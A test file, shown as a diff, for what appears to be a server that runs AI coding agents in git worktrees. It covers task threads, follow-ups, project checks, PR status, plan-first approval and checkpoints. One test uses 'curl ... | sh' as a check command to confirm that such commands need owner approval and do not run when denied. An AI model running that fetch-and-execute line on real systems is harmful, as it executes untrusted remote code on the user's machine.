@@ -1,0 +1,687 @@
+// Task thread API: rename/archive, follow-ups and steering, project checks, PR status, usage, plan first, checkpoints.
+import { execFileSync } from 'node:child_process'
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import { join } from 'node:path'
+import type { AgentEvent, AgentProvider, ProviderKind, RunOptions, TaskId, Workspace } from '@joy/core'
+import { ConfigStore } from '@joy/config'
+import { openDatabase } from '@joy/db'
+import type { Database } from '@joy/db'
+import { WorktreeExecutor } from '@joy/executor'
+import type { RunInWorktreeInput } from '@joy/executor'
+import { REVIEW_SCHEMA } from '@joy/orchestrator'
+import { MemoryBackend, Redactor, SecretStore } from '@joy/secrets'
+import { afterEach, describe, expect, it } from 'vitest'
+import { createJoyServer } from './server.js'
+import type { JoyServer, JoyServerOptions } from './server.js'
+
+const TOKEN = 'test-api-token-for-thread-tests-0042'
+const servers: JoyServer[] = []
+const databases: Database[] = []
+const dirs: string[] = []
+
+afterEach(async () => {
+  for (const server of servers.splice(0)) await server.close()
+  for (const db of databases.splice(0)) if (db.isOpen) db.close()
+  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true })
+})
+
+function tempDir(prefix: string): string {
+  const dir = mkdtempSync(join(tmpdir(), prefix))
+  dirs.push(dir)
+  return dir
+}
+
+type Gate = { promise: Promise<void>; open: () => void }
+function gate(): Gate {
+  let open = () => {}
+  const promise = new Promise<void>((resolve) => (open = resolve))
+  return { promise, open }
+}
+
+interface Verdict {
+  approve: boolean
+  findings?: Array<{ severity: string; message: string }>
+}
+
+/**
+ * One fake per backend. Reviews (outputSchema) answer from `verdicts` (approve by default); other runs call `work`
+ * (to change files or wait) and report usage.
+ */
+function fakeProvider(kind: ProviderKind) {
+  const calls: RunOptions[] = []
+  const verdicts: Verdict[] = []
+  const state: { work?: ((options: RunOptions, call: number) => Promise<void> | void) | undefined } = {}
+  const provider: AgentProvider = {
+    kind,
+    capabilities: {
+      codeEdit: true,
+      tools: true,
+      resume: true,
+      presetSessionId: false,
+      delegatedApproval: false,
+      quotaEvents: false,
+      structuredOutput: true,
+    },
+    async *run(options: RunOptions): AsyncGenerator<AgentEvent> {
+      calls.push(options)
+      if (options.outputSchema === REVIEW_SCHEMA) {
+        const verdict = verdicts.shift() ?? { approve: true }
+        yield { type: 'usage', inputTokens: 10, outputTokens: 1 }
+        yield {
+          type: 'done',
+          sessionId: 'review',
+          isError: false,
+          structured: { approve: verdict.approve, summary: 'review', findings: verdict.findings ?? [] },
+        }
+        return
+      }
+      const sessionId = options.resumeSessionId ?? `${kind}-session`
+      if (!options.resumeSessionId) yield { type: 'session_started', sessionId }
+      await state.work?.(options, calls.length)
+      yield { type: 'usage', inputTokens: 100, outputTokens: 20, costUsd: 0.5 }
+      yield { type: 'done', sessionId, isError: false, finalMessage: `plan or result ${calls.length}` }
+    },
+    healthCheck: async () => ({ ok: true, installed: true, loggedIn: true as const }),
+  }
+  return { provider, calls, verdicts, state }
+}
+
+/** A fake executor: one fixed worktree, a diff that always has a change, and scripted check results. */
+class FakeExecutor {
+  readonly runs: RunInWorktreeInput[] = []
+  checkResults: Array<{ exitCode: number; output: string }> = []
+  async prepare(repo: Workspace['repo'], taskId: TaskId, attemptId: Workspace['attemptId']) {
+    return { repo, taskId, attemptId, path: '/fake/worktree', branch: 'joy/t/a', baseCommit: 'base' }
+  }
+  async diff() {
+    return {
+      files: [{ path: 'a.ts', status: 'modified' as const, additions: 1, deletions: 0 }],
+      patch: '+a\n',
+    }
+  }
+  async commit() {
+    return null
+  }
+  async cleanup() {}
+  async run(_ws: Workspace, input: RunInWorktreeInput) {
+    this.runs.push(input)
+    const next = this.checkResults.shift() ?? { exitCode: 0, output: 'ok' }
+    return { exitCode: next.exitCode, output: next.output, timedOut: false }
+  }
+}
+
+async function setup(
+  options: {
+    executor?: JoyServerOptions['executor']
+    ghRunner?: JoyServerOptions['ghRunner']
+    publisher?: JoyServerOptions['publisher']
+    config?: string
+  } = {},
+) {
+  const home = tempDir('joy-thread-')
+  writeFileSync(join(home, 'config.yaml'), options.config ?? 'approvals:\n  on_timeout: deny\n')
+  const db = openDatabase(':memory:')
+  databases.push(db)
+  const redactor = new Redactor()
+  const claude = fakeProvider('claude-cli')
+  const codex = fakeProvider('codex-cli')
+  const executor = new FakeExecutor()
+  const server = await createJoyServer({
+    home,
+    database: db,
+    configStore: new ConfigStore(join(home, 'config.yaml')),
+    secretStore: new SecretStore({ backend: new MemoryBackend(), onSecret: (s) => redactor.add(s) }),
+    redactor,
+    executor: options.executor ?? executor,
+    apiToken: TOKEN,
+    approvalTimeoutMs: 2_000,
+    cliVersionCheck: false,
+    backups: false,
+    memoryExtraction: false,
+    conversationSummaries: false,
+    providers: { 'claude-cli': claude.provider, 'codex-cli': codex.provider },
+    ...(options.ghRunner ? { ghRunner: options.ghRunner } : {}),
+    ...(options.publisher ? { publisher: options.publisher } : {}),
+  })
+  servers.push(server)
+  const address = await server.listen()
+  const origin = `http://127.0.0.1:${address.port}`
+  const call = async (method: string, path: string, body?: unknown) => {
+    const response = await fetch(`${origin}${path}`, {
+      method,
+      headers: {
+        authorization: `Bearer ${TOKEN}`,
+        // State-changing requests must come from the local UI's origin.
+        origin: 'http://127.0.0.1:5173',
+        ...(body !== undefined ? { 'content-type': 'application/json' } : {}),
+      },
+      ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
+    })
+    return { status: response.status, body: (await response.json()) as Record<string, unknown> }
+  }
+  return { origin, call, db, claude, codex, executor, redactor }
+}
+
+type Call = Awaited<ReturnType<typeof setup>>['call']
+type Details = {
+  task: Record<string, unknown> & { status: string }
+  attempts: Array<Record<string, unknown>>
+  events: Array<{ type: string; payload: Record<string, unknown>; attemptId?: string }>
+  usage: Record<string, unknown>
+  pendingPlan: { plan: string } | null
+  queuedMessages: unknown[]
+  reviews: Array<{ round: number }>
+}
+
+async function details(call: Call, id: string): Promise<Details> {
+  return (await call('GET', `/api/tasks/${id}`)).body as unknown as Details
+}
+
+async function until(call: Call, id: string, check: (d: Details) => boolean, what: string): Promise<Details> {
+  const deadline = Date.now() + 10_000
+  let last: Details | undefined
+  while (Date.now() < deadline) {
+    last = await details(call, id)
+    if (check(last)) return last
+    await new Promise((resolve) => setTimeout(resolve, 10))
+  }
+  throw new Error(`Timed out waiting for ${what} (status ${last?.task.status})`)
+}
+
+const settled = (status: string) => (d: Details) => d.task.status === status
+const count = (d: Details, type: string) => d.events.filter((event) => event.type === type).length
+
+async function newRepo(call: Call, path = '/tmp/thread-repo', extra: object = {}) {
+  const { body } = await call('POST', '/api/repos', { path, defaultBranch: 'main', ...extra })
+  return (body.repo as { id: string }).id
+}
+
+async function newTask(call: Call, repoId: string, extra: object = {}) {
+  const { status, body } = await call('POST', '/api/tasks', {
+    repoId,
+    title: 'Fix add()',
+    prompt: 'Fix add()',
+    mode: 'single',
+    ...extra,
+  })
+  expect(status).toBe(201)
+  return (body.task as { id: string }).id
+}
+
+describe('task rename, archive and details', () => {
+  it('renames and archives tasks, hides archived ones by default and exposes branch, times and usage', async () => {
+    const { call } = await setup()
+    const repoId = await newRepo(call)
+    const id = await newTask(call, repoId)
+    const done = await until(call, id, settled('done'), 'done')
+    expect(done.attempts[0]).toMatchObject({ branch: 'joy/t/a', worktreePath: '/fake/worktree' })
+    expect(done.task).toMatchObject({
+      createdAt: expect.any(String),
+      updatedAt: expect.any(String),
+      archived: false,
+    })
+    expect(done.usage).toMatchObject({
+      inputTokens: 100,
+      outputTokens: 20,
+      costUsd: 0.5,
+      byProvider: [{ provider: 'claude-cli', inputTokens: 100, outputTokens: 20, costUsd: 0.5 }],
+    })
+    expect(done.usage.durationMs).toEqual(expect.any(Number))
+
+    expect((await call('PATCH', `/api/tasks/${id}`, {})).status).toBe(400)
+    expect((await call('PATCH', `/api/tasks/${id}`, { title: '' })).status).toBe(400)
+    const renamed = await call('PATCH', `/api/tasks/${id}`, { title: 'Sum numbers' })
+    expect(renamed).toMatchObject({ status: 200, body: { task: { title: 'Sum numbers', archived: false } } })
+    expect((await call('PATCH', `/api/tasks/${id}`, { archived: true })).body.task).toMatchObject({
+      archived: true,
+    })
+    expect(((await call('GET', '/api/tasks')).body.tasks as unknown[]).length).toBe(0)
+    expect((await call('GET', '/api/tasks?archived=1')).body.tasks).toMatchObject([{ id, archived: true }])
+    expect((await details(call, id)).events.filter((e) => e.type === 'task.updated')).toHaveLength(2)
+    expect((await call('PATCH', '/api/tasks/missing', { title: 'x' })).status).toBe(404)
+  })
+
+  it('refuses to archive a running task', async () => {
+    const { call, claude } = await setup()
+    const wait = gate()
+    claude.state.work = () => wait.promise
+    const id = await newTask(call, await newRepo(call))
+    await until(call, id, settled('running'), 'running')
+    expect((await call('PATCH', `/api/tasks/${id}`, { archived: true })).status).toBe(409)
+    wait.open()
+    await until(call, id, settled('done'), 'done')
+  })
+})
+
+describe('follow-up messages and steering', () => {
+  it('continues a finished single task in the same session with the owner message', async () => {
+    const { call, claude } = await setup()
+    const id = await newTask(call, await newRepo(call))
+    await until(call, id, settled('done'), 'done')
+    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Also handle negative numbers' })
+    expect(sent).toMatchObject({ status: 202, body: { message: { delivery: 'follow_up' } } })
+    const after = await until(
+      call,
+      id,
+      (d) => d.task.status === 'done' && count(d, 'result') === 2,
+      'follow-up',
+    )
+    expect(claude.calls).toHaveLength(2)
+    expect(claude.calls[1]).toMatchObject({ resumeSessionId: 'claude-cli-session', cwd: '/fake/worktree' })
+    expect(claude.calls[1]?.prompt).toContain('Also handle negative numbers')
+    expect(after.events.find((e) => e.type === 'user.message')?.payload).toMatchObject({
+      text: 'Also handle negative numbers',
+      provenance: 'user',
+      delivery: 'follow_up',
+    })
+    expect((await call('POST', `/api/tasks/${id}/messages`, { text: '' })).status).toBe(400)
+  })
+
+  it('reruns the review loop after a follow-up, with later round numbers and the instruction for the reviewer', async () => {
+    const { call, claude, codex } = await setup()
+    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
+    await until(call, id, settled('done'), 'done')
+    await call('POST', `/api/tasks/${id}/messages`, { text: 'Rename add to sum' })
+    const after = await until(call, id, (d) => d.task.status === 'done' && d.reviews.length === 2, 'rereview')
+    expect(after.reviews.map((review) => review.round)).toEqual([1, 2])
+    expect(claude.calls[1]?.prompt).toContain('Rename add to sum')
+    expect(codex.calls[1]?.prompt).toContain('Rename add to sum')
+  })
+
+  it('queues a message while running and delivers it at the next fix round', async () => {
+    const { call, claude, codex } = await setup()
+    const wait = gate()
+    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
+    codex.verdicts.push({ approve: false, findings: [{ severity: 'major', message: 'handle NaN' }] })
+    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
+    await until(call, id, settled('running'), 'running')
+    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Keep the public API' })
+    expect(sent.body.message).toMatchObject({ delivery: 'queued' })
+    expect((await details(call, id)).queuedMessages).toHaveLength(1)
+    wait.open()
+    const done = await until(call, id, settled('done'), 'done')
+    expect(claude.calls[1]?.prompt).toContain('handle NaN')
+    expect(claude.calls[1]?.prompt).toContain('- Keep the public API')
+    expect(done.events.find((e) => e.type === 'user.message.delivered')?.payload).toMatchObject({
+      via: 'next_turn',
+    })
+    expect(done.queuedMessages).toEqual([])
+  })
+
+  it('continues a single task right after the run when a message arrived too late for it', async () => {
+    const { call, claude } = await setup()
+    const wait = gate()
+    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
+    const id = await newTask(call, await newRepo(call))
+    await until(call, id, settled('running'), 'running')
+    await call('POST', `/api/tasks/${id}/messages`, { text: 'Add a changelog entry' })
+    wait.open()
+    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'auto follow-up')
+    expect(claude.calls[1]).toMatchObject({ resumeSessionId: 'claude-cli-session' })
+    expect(claude.calls[1]?.prompt).toContain('Add a changelog entry')
+  })
+
+  it('discards queued messages when the task is cancelled, and refuses compete tasks', async () => {
+    const { call, claude } = await setup()
+    claude.state.work = (options) =>
+      new Promise((resolve) => options.signal.addEventListener('abort', () => resolve(), { once: true }))
+    const id = await newTask(call, await newRepo(call))
+    await until(call, id, settled('running'), 'running')
+    await call('POST', `/api/tasks/${id}/messages`, { text: 'never mind' })
+    await call('POST', `/api/tasks/${id}/cancel`)
+    const cancelled = await until(call, id, (d) => count(d, 'user.message.discarded') === 1, 'discard')
+    expect(cancelled.task.status).toBe('cancelled')
+
+    claude.state.work = undefined
+    const competeId = await newTask(call, await newRepo(call, '/tmp/thread-compete'), { mode: 'compete' })
+    expect((await call('POST', `/api/tasks/${competeId}/messages`, { text: 'hi' })).status).toBe(409)
+    const ended = await until(
+      call,
+      competeId,
+      (d) => !['queued', 'running'].includes(d.task.status),
+      'compete',
+    )
+    expect((await call('POST', `/api/tasks/${competeId}/messages`, { text: 'hi' })).status).toBe(409)
+    expect(ended.events.some((e) => e.type === 'user.message')).toBe(false)
+  })
+})
+
+describe('owner messages that were not delivered', () => {
+  it('leaves discarded messages out of what the reviewer is told later', async () => {
+    const { call, claude, codex } = await setup()
+    claude.state.work = (options, n) =>
+      n === 1
+        ? new Promise((resolve) => options.signal.addEventListener('abort', () => resolve(), { once: true }))
+        : undefined
+    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
+    await until(call, id, settled('running'), 'running')
+    await call('POST', `/api/tasks/${id}/messages`, { text: 'DISCARDED-INSTRUCTION' })
+    await call('POST', `/api/tasks/${id}/cancel`)
+    await until(
+      call,
+      id,
+      (d) => d.task.status === 'cancelled' && count(d, 'user.message.discarded') === 1,
+      'x',
+    )
+    expect((await call('POST', `/api/tasks/${id}/messages`, { text: 'KEPT-INSTRUCTION' })).status).toBe(202)
+    await until(call, id, settled('done'), 'done')
+    expect(codex.calls[0]?.prompt).toContain('KEPT-INSTRUCTION')
+    expect(codex.calls[0]?.prompt).not.toContain('DISCARDED-INSTRUCTION')
+  })
+
+  it('brings an archived task back to the list when the owner continues it', async () => {
+    const { call } = await setup()
+    const id = await newTask(call, await newRepo(call))
+    await until(call, id, settled('done'), 'done')
+    await call('PATCH', `/api/tasks/${id}`, { archived: true })
+    expect((await call('POST', `/api/tasks/${id}/messages`, { text: 'one more thing' })).status).toBe(202)
+    const done = await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'x')
+    expect(done.task.archived).toBe(false)
+    expect(done.events.filter((e) => e.type === 'task.updated').at(-1)?.payload).toEqual({ archived: false })
+  })
+})
+
+describe('project checks', () => {
+  it('validates, sets and clears the repository check command', async () => {
+    const { call } = await setup()
+    const repoId = await newRepo(call)
+    expect((await call('PATCH', `/api/repos/${repoId}`, { checkCommand: 'pnpm check' })).status).toBe(400)
+    expect((await call('PATCH', `/api/repos/${repoId}`, { checkCommand: [] })).status).toBe(400)
+    const set = await call('PATCH', `/api/repos/${repoId}`, { checkCommand: ['pnpm', 'check'] })
+    expect(set.body.repo).toMatchObject({ checkCommand: ['pnpm', 'check'] })
+    const cleared = await call('PATCH', `/api/repos/${repoId}`, { checkCommand: null })
+    expect((cleared.body.repo as Record<string, unknown>).checkCommand).toBeUndefined()
+  })
+
+  it('runs checks before review, feeds failures back as a fix round and redacts the output', async () => {
+    const { call, claude, codex, executor, redactor } = await setup()
+    redactor.add('check-secret-123456')
+    executor.checkResults.push(
+      { exitCode: 1, output: 'FAIL add.test.ts token=check-secret-123456' },
+      { exitCode: 0, output: 'all passed' },
+    )
+    const repoId = await newRepo(call, '/tmp/thread-repo', { checkCommand: ['pnpm', 'check'] })
+    const id = await newTask(call, repoId, { mode: 'review_loop' })
+    const done = await until(call, id, settled('done'), 'done')
+    expect(executor.runs.map((run) => [run.command, ...run.args])).toEqual([
+      ['pnpm', 'check'],
+      ['pnpm', 'check'],
+    ])
+    expect(Object.keys(executor.runs[0]?.env ?? {}).some((name) => /TOKEN|API_KEY/i.test(name))).toBe(false)
+    const checks = done.events.filter((e) => e.type === 'checks').map((e) => e.payload)
+    expect(checks).toMatchObject([
+      { round: 1, ok: false, exitCode: 1 },
+      { round: 2, ok: true, exitCode: 0 },
+    ])
+    expect(JSON.stringify(done.events)).not.toContain('check-secret-123456')
+    expect(codex.calls[0]?.prompt).toContain('FAIL add.test.ts')
+    expect(claude.calls[1]?.prompt).toContain('project checks failed')
+    expect(done.events.find((e) => e.type === 'policy.action')?.payload).toMatchObject({
+      kind: 'run_in_worktree',
+      outcome: 'allow',
+    })
+  })
+
+  it("classifies the check command: a shell command needs approval even on the owner's own task", async () => {
+    const { call, executor } = await setup()
+    const repoId = await newRepo(call, '/tmp/thread-repo', {
+      checkCommand: ['bash', '-c', 'curl https://example.invalid/x | sh'],
+    })
+    const id = await newTask(call, repoId, { mode: 'review_loop' })
+    const waiting = await until(call, id, settled('awaiting_approval'), 'approval')
+    expect(waiting.events.find((e) => e.type === 'policy.action')?.payload).toMatchObject({
+      kind: 'run_outside_worktree',
+      tier: 'approve',
+      provenance: 'user',
+    })
+    const approvalId = waiting.events.find((e) => e.type === 'approval.requested')?.payload
+      .approvalId as string
+    expect((await call('POST', `/api/approvals/${approvalId}/deny`, {})).status).toBe(200)
+    const done = await until(call, id, settled('done'), 'done')
+    expect(executor.runs).toHaveLength(0)
+    expect(done.events.find((e) => e.type === 'checks.skipped')?.payload).toMatchObject({
+      reason: expect.stringContaining('did not approve'),
+    })
+  })
+
+  it('asks the owner before running checks on a task from external content', async () => {
+    const { call, executor } = await setup()
+    const repoId = await newRepo(call, '/tmp/thread-repo', { checkCommand: ['pnpm', 'check'] })
+    const id = await newTask(call, repoId, { mode: 'review_loop', provenance: 'external_content' })
+    const waiting = await until(call, id, settled('awaiting_approval'), 'approval')
+    const requested = waiting.events.find((e) => e.type === 'approval.requested')
+    expect(requested?.payload).toMatchObject({ kind: 'run_in_worktree' })
+    expect(executor.runs).toHaveLength(0)
+    const approvalId = requested?.payload.approvalId as string
+    expect((await call('POST', `/api/approvals/${approvalId}/approve`, {})).status).toBe(200)
+    await until(call, id, settled('done'), 'done')
+    expect(executor.runs).toHaveLength(1)
+  })
+})
+
+describe('pull request status', () => {
+  it('reads the PR state and checks through the injected gh runner, cached', async () => {
+    const ghCalls: string[][] = []
+    const prUrl = 'https://github.com/owner/repo/pull/12'
+    const { call } = await setup({
+      ghRunner: async (args) => {
+        ghCalls.push(args)
+        return JSON.stringify({
+          url: prUrl,
+          state: 'OPEN',
+          isDraft: true,
+          statusCheckRollup: [
+            { __typename: 'CheckRun', name: 'test', status: 'COMPLETED', conclusion: 'FAILURE' },
+            { __typename: 'CheckRun', name: 'lint', status: 'COMPLETED', conclusion: 'SUCCESS' },
+            { __typename: 'CheckRun', name: 'e2e', status: 'QUEUED', conclusion: '' },
+          ],
+        })
+      },
+      publisher: { publish: async () => ({ pullRequestUrl: prUrl, commitSha: 'abc', body: 'b' }) },
+    })
+    const repoId = await newRepo(call, '/tmp/thread-repo', { githubRemote: 'https://github.com/owner/repo' })
+    const id = await newTask(call, repoId)
+    await until(call, id, settled('done'), 'done')
+    expect((await call('GET', `/api/tasks/${id}/pr`)).status).toBe(404)
+    expect((await call('POST', `/api/tasks/${id}/publish`, {})).status).toBe(200)
+    const pr = await call('GET', `/api/tasks/${id}/pr`)
+    expect(pr).toMatchObject({
+      status: 200,
+      body: {
+        url: prUrl,
+        state: 'OPEN',
+        isDraft: true,
+        checks: { passing: 1, failing: 1, pending: 1, failingNames: ['test'] },
+      },
+    })
+    await call('GET', `/api/tasks/${id}/pr`)
+    expect(ghCalls).toEqual([['pr', 'view', prUrl, '--json', 'url,state,isDraft,statusCheckRollup']])
+  })
+
+  it('answers 502 when gh fails', async () => {
+    const prUrl = 'https://github.com/owner/repo/pull/13'
+    const { call } = await setup({
+      ghRunner: async () => {
+        throw new Error('gh: not logged in')
+      },
+      publisher: { publish: async () => ({ pullRequestUrl: prUrl, commitSha: 'abc', body: 'b' }) },
+    })
+    const repoId = await newRepo(call, '/tmp/thread-repo', { githubRemote: 'https://github.com/owner/repo' })
+    const id = await newTask(call, repoId)
+    await until(call, id, settled('done'), 'done')
+    await call('POST', `/api/tasks/${id}/publish`, {})
+    expect(await call('GET', `/api/tasks/${id}/pr`)).toMatchObject({
+      status: 502,
+      body: { error: expect.stringContaining('not logged in') },
+    })
+  })
+})
+
+describe('plan first', () => {
+  it('plans a single task read-only, waits for approval, then implements in the same session', async () => {
+    const { call, claude } = await setup()
+    const id = await newTask(call, await newRepo(call), { planFirst: true })
+    const waiting = await until(call, id, settled('review_ready'), 'plan')
+    expect(waiting.pendingPlan).toEqual({ plan: 'plan or result 1' })
+    expect(claude.calls[0]).toMatchObject({ autonomy: 'read-only' })
+    expect(claude.calls[0]?.prompt).toContain('implementation plan')
+    expect((await call('POST', `/api/tasks/${id}/plan/approve`, { note: 'Go ahead' })).status).toBe(202)
+    const done = await until(call, id, settled('done'), 'done')
+    expect(done.pendingPlan).toBeNull()
+    expect(claude.calls[1]).toMatchObject({
+      autonomy: 'workspace-write',
+      resumeSessionId: 'claude-cli-session',
+    })
+    expect(claude.calls[1]?.prompt).toContain('Go ahead')
+    expect((await call('POST', `/api/tasks/${id}/plan/approve`, {})).status).toBe(409)
+  })
+
+  it('revises the plan when the owner answers with a message, and rejects it on request', async () => {
+    const { call, claude, codex } = await setup()
+    const id = await newTask(call, await newRepo(call), { mode: 'review_loop', planFirst: true })
+    await until(call, id, settled('review_ready'), 'plan')
+    expect(codex.calls[0]?.prompt).toContain('plan or result 1')
+    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Smaller, please' })
+    expect(sent.body.message).toMatchObject({ delivery: 'replan' })
+    const revised = await until(
+      call,
+      id,
+      (d) => d.task.status === 'review_ready' && count(d, 'plan.awaiting_approval') === 2,
+      'revised plan',
+    )
+    expect(claude.calls[1]).toMatchObject({ autonomy: 'read-only', resumeSessionId: 'claude-cli-session' })
+    expect(claude.calls[1]?.prompt).toContain('Smaller, please')
+    expect(revised.pendingPlan).toMatchObject({ plan: 'plan or result 2' })
+    const rejected = await call('POST', `/api/tasks/${id}/plan/reject`, { note: 'Not now' })
+    expect(rejected.body.task).toMatchObject({ status: 'cancelled' })
+    expect(claude.calls).toHaveLength(2)
+  })
+
+  it('refuses plan first for compete tasks', async () => {
+    const { call } = await setup()
+    const repoId = await newRepo(call)
+    const response = await call('POST', '/api/tasks', {
+      repoId,
+      title: 'x',
+      prompt: 'x',
+      mode: 'compete',
+      planFirst: true,
+    })
+    expect(response.status).toBe(422)
+  })
+})
+
+/** A one-commit repository with add.js, and where its worktrees go. */
+function realRepo() {
+  const root = tempDir('joy-checkpoints-')
+  const repoPath = join(root, 'repo')
+  const run = (...args: string[]) => execFileSync('git', args, { cwd: repoPath, stdio: 'pipe' }).toString()
+  mkdirSync(repoPath)
+  run('init', '-q', '-b', 'main')
+  run('config', 'core.autocrlf', 'false')
+  writeFileSync(join(repoPath, 'add.js'), 'start\n')
+  run('add', '.')
+  run('-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'init')
+  return { repoPath, worktreesDir: join(root, 'worktrees') }
+}
+
+/** Restores slowly, so a second request reliably arrives while the first one is still restoring. */
+class SlowRestoreExecutor extends WorktreeExecutor {
+  override async restoreCheckpoint(...args: Parameters<WorktreeExecutor['restoreCheckpoint']>) {
+    await new Promise((resolve) => setTimeout(resolve, 400))
+    return super.restoreCheckpoint(...args)
+  }
+}
+
+describe('checkpoints', () => {
+  it('checkpoints each implementer turn and restores one, keeping the current state as a new checkpoint', async () => {
+    const { repoPath, worktreesDir } = realRepo()
+    const { call, claude } = await setup({ executor: new WorktreeExecutor({ worktreesDir }) })
+    claude.state.work = (options, n) => writeFileSync(join(options.cwd, 'add.js'), `turn ${n}\n`)
+    const id = await newTask(call, await newRepo(call, repoPath))
+    const first = await until(call, id, settled('done'), 'done')
+    const worktree = first.attempts[0]?.worktreePath as string
+    await call('POST', `/api/tasks/${id}/messages`, { text: 'again' })
+    await until(
+      call,
+      id,
+      (d) => d.task.status === 'done' && count(d, 'checkpoint.created') === 2,
+      'second turn',
+    )
+    expect(readFileSync(join(worktree, 'add.js'), 'utf8')).toBe('turn 2\n')
+
+    const listed = (await call('GET', `/api/tasks/${id}/checkpoints`)).body.checkpoints as Array<
+      Record<string, unknown>
+    >
+    expect(listed.map((c) => [c.n, c.ref, c.available])).toEqual([
+      [1, `refs/joy/checkpoints/${id}/1`, true],
+      [2, `refs/joy/checkpoints/${id}/2`, true],
+    ])
+    const restored = await call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})
+    expect(restored).toMatchObject({ status: 200, body: { restored: 1, savedAs: 3, discardedCommits: 0 } })
+    expect(readFileSync(join(worktree, 'add.js'), 'utf8')).toBe('turn 1\n')
+    expect(readFileSync(join(repoPath, 'add.js'), 'utf8')).toBe('start\n')
+    expect((await call('POST', `/api/tasks/${id}/checkpoints/3/restore`, {})).status).toBe(200)
+    expect(readFileSync(join(worktree, 'add.js'), 'utf8')).toBe('turn 2\n')
+    expect((await call('POST', `/api/tasks/${id}/checkpoints/9/restore`, {})).status).toBe(404)
+
+    // The agent hears about the restore with the next follow-up.
+    await call('POST', `/api/tasks/${id}/messages`, { text: 'continue' })
+    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 3, 'third turn')
+    expect(claude.calls[2]?.prompt).toContain('restored the worktree to checkpoint')
+    // Several real repository operations per turn: slow on shared CI runners.
+  }, 30_000)
+
+  it('refuses to restore while the task runs', async () => {
+    const { repoPath, worktreesDir } = realRepo()
+    const { call, claude } = await setup({ executor: new WorktreeExecutor({ worktreesDir }) })
+    const id = await newTask(call, await newRepo(call, repoPath))
+    await until(call, id, settled('done'), 'done')
+    const wait = gate()
+    claude.state.work = () => wait.promise
+    await call('POST', `/api/tasks/${id}/messages`, { text: 'more' })
+    await until(call, id, settled('running'), 'running')
+    expect(await call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})).toMatchObject({
+      status: 409,
+      body: { error: expect.stringContaining('wait for it to finish') },
+    })
+    wait.open()
+    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'second run')
+  }, 30_000)
+
+  it('refuses checkpoints with an executor that keeps none', async () => {
+    const { call } = await setup()
+    const id = await newTask(call, await newRepo(call))
+    await until(call, id, settled('done'), 'done')
+    expect((await call('GET', `/api/tasks/${id}/checkpoints`)).body.checkpoints).toEqual([])
+    expect(await call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})).toMatchObject({
+      status: 409,
+      body: { error: expect.stringContaining('not available') },
+    })
+  })
+
+  it('lets one owner action at a time touch a task: a restore blocks a second restore and a message', async () => {
+    const { repoPath, worktreesDir } = realRepo()
+    const { call, claude } = await setup({ executor: new SlowRestoreExecutor({ worktreesDir }) })
+    claude.state.work = (options, n) => writeFileSync(join(options.cwd, 'add.js'), `turn ${n}\n`)
+    const id = await newTask(call, await newRepo(call, repoPath))
+    await until(call, id, settled('done'), 'done')
+    const first = call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})
+    await new Promise((resolve) => setTimeout(resolve, 150))
+    const second = await call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})
+    const message = await call('POST', `/api/tasks/${id}/messages`, { text: 'go on' })
+    expect(second).toMatchObject({ status: 409, body: { error: expect.stringContaining('in progress') } })
+    expect(message).toMatchObject({ status: 409, body: { error: expect.stringContaining('in progress') } })
+    expect(await first).toMatchObject({ status: 200, body: { restored: 1, savedAs: 2 } })
+    expect(claude.calls).toHaveLength(1)
+    // Every checkpoint number is unique and each one can still be restored.
+    const listed = (await call('GET', `/api/tasks/${id}/checkpoints`)).body.checkpoints as Array<{
+      n: number
+    }>
+    expect(listed.map((c) => c.n)).toEqual([1, 2])
+    expect((await call('POST', `/api/tasks/${id}/checkpoints/2/restore`, {})).status).toBe(200)
+    expect((await call('POST', `/api/tasks/${id}/messages`, { text: 'go on' })).status).toBe(202)
+    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'follow-up')
+  }, 30_000)
+})
